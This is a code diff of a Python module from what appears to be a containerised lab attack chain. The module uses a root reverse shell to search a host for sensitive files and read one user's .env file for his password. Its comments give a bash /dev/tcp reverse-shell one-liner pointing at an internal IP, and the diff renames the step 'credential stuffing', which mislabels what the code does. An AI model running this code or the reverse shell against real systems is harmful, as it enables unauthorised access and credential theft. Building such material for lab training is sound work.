@@ -3,19 +3,17 @@ import shlex
 import socket
 import time
 
-from chainlog import log
+from chainlog import log, run_remote
 
 # =============================================================================
-# credential_access.py — Discover internal credentials from john's .env
+# credential_stuffing.py — Discover internal credentials from john's .env
 # MITRE ATT&CK:
 #   T1552.001 – Credentials In Files     (read john's ~/.env on apache)
 # -----------------------------------------------------------------------------
 # Runs FROM apache via the root reverse shell.
 # Searches for common sensitive file patterns (noise) then reads john's ~/.env
-# file to recover his password.  This is Credential Access via credentials in
-# files — NOT credential stuffing.  The actual credential stuffing (reusing
-# john's recovered password across internal hosts, T1110.004) happens later in
-# lateral_movement.py.
+# file to recover his password.  Network discovery and credential stuffing are
+# handled in lateral_movement.py.
 # =============================================================================
 
 ENV_FILE_PATH   = "/home/john.stravidis/.env"
@@ -34,51 +32,6 @@ _NOISE_FILE_PATTERNS = [
     ("db_password.txt", ["/home", "/root",                     "/opt"]),
 ]
 
-
-_sentinel_seq = 0
-
-
-def _drain(shell):
-    prev = shell.gettimeout()
-    shell.settimeout(0.1)
-    while True:
-        try:
-            if not shell.recv(4096):
-                break
-        except socket.timeout:
-            break
-    shell.settimeout(prev)
-
-
-def _run_remote(shell, cmd, timeout=10):
-    """Send cmd through `shell`, return captured stdout up to a sentinel echo."""
-    global _sentinel_seq
-    _sentinel_seq += 1
-    sentinel = f"CA_SENTINEL_{_sentinel_seq:04X}_END"
-
-    _drain(shell)
-    shell.sendall(f"{cmd}\n".encode())
-    time.sleep(0.4)
-    shell.sendall(f"echo {sentinel}\n".encode())
-
-    prev_timeout = shell.gettimeout()
-    shell.settimeout(2)
-    buf = ""
-    deadline = time.time() + timeout
-    while time.time() < deadline:
-        try:
-            buf += shell.recv(4096).decode(errors="replace")
-        except socket.timeout:
-            pass
-        if sentinel in buf:
-            break
-    shell.settimeout(prev_timeout)
-
-    if sentinel in buf:
-        buf = buf[:buf.index(sentinel)]
-    buf = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", buf)
-    buf = buf.replace("\r", "")
-    return buf.strip()
 
 
 def _extract_password(env_text, var_names=("WS_PASS", "JOHN_PASS", "PASSWORD")):
@@ -103,7 +56,7 @@ def _search_noise_files(shell):
     the root reverse shell echoes a PS1 prompt (and, on some shells, the
     command itself) into every `_run_remote` capture, so a plain emptiness
     check would treat that prompt noise as a hit and fire the `[?]` branch on
-    every pattern.  Only lines carrying the `CA_NOISE_HIT` marker count as
+    every pattern.  Only lines carrying the `CS_NOISE_HIT` marker count as
     real finds.
     """
     log("[*] Expanding credential search to common sensitive file patterns...")
@@ -112,13 +65,13 @@ def _search_noise_files(shell):
         search_dirs = " ".join(dirs)
         cmd = (
             f"find {search_dirs} -maxdepth 4 -name {shlex.quote(filename)} "
-            f"-printf 'CA_NOISE_HIT %p\\n' 2>/dev/null"
+            f"-printf 'CS_NOISE_HIT %p\\n' 2>/dev/null"
         )
-        out = _run_remote(shell, cmd, timeout=10)
+        out = run_remote(shell, cmd, timeout=10)
         hits = [
-            line[len("CA_NOISE_HIT "):]
+            line[len("CS_NOISE_HIT "):]
             for line in out.splitlines()
-            if line.startswith("CA_NOISE_HIT ")
+            if line.startswith("CS_NOISE_HIT ")
         ]
         if hits:
             any_hits = True
@@ -133,17 +86,16 @@ def _search_noise_files(shell):
 
 def run(root_shell, target_user=TARGET_USERNAME):
     """
-    Execute the credential-access step on apache via the root shell.
+    Execute the credential-discovery step on apache via the root shell.
 
     Searches for sensitive file patterns (noise) then reads john's .env file
-    to recover his password (Credential Access, T1552.001).  Network discovery
-    and credential stuffing against internal hosts are handled later by the
-    lateral movement step.
+    to recover his password.  Network discovery and credential stuffing against
+    internal hosts are handled by the lateral movement step.
 
     Returns a dict with:
         john_password — the password recovered from the env file (or None)
     """
-    log("\n[*] Starting credential access (credentials in files)...")
+    log("\n[*] Starting credential discovery...")
 
     # ------------------------------------------------------------------
     # Phase 1 — Credentials in files (T1552.001)
@@ -151,7 +103,7 @@ def run(root_shell, target_user=TARGET_USERNAME):
     # ------------------------------------------------------------------
     _search_noise_files(root_shell)
     log(f"[*] Reading {ENV_FILE_PATH} on apache...")
-    env_blob = _run_remote(root_shell, f"cat {ENV_FILE_PATH}")
+    env_blob = run_remote(root_shell, f"cat {ENV_FILE_PATH}", timeout=10)
     password = _extract_password(env_blob)
     if not password:
         log(f"[-] No usable password variable found in {ENV_FILE_PATH}")
@@ -163,7 +115,7 @@ def run(root_shell, target_user=TARGET_USERNAME):
 
 
 # Test mode — same pattern as the other chain modules.
-# Usage: docker compose exec kali python3 /Attack-chain/credential_access.py
+# Usage: docker compose exec kali python3 /Attack-chain/credential_stuffing.py
 # Then in another terminal, on apache:
 #   docker exec apache bash -c 'bash -i >& /dev/tcp/10.10.0.2/5555 0>&1'
 if __name__ == "__main__":
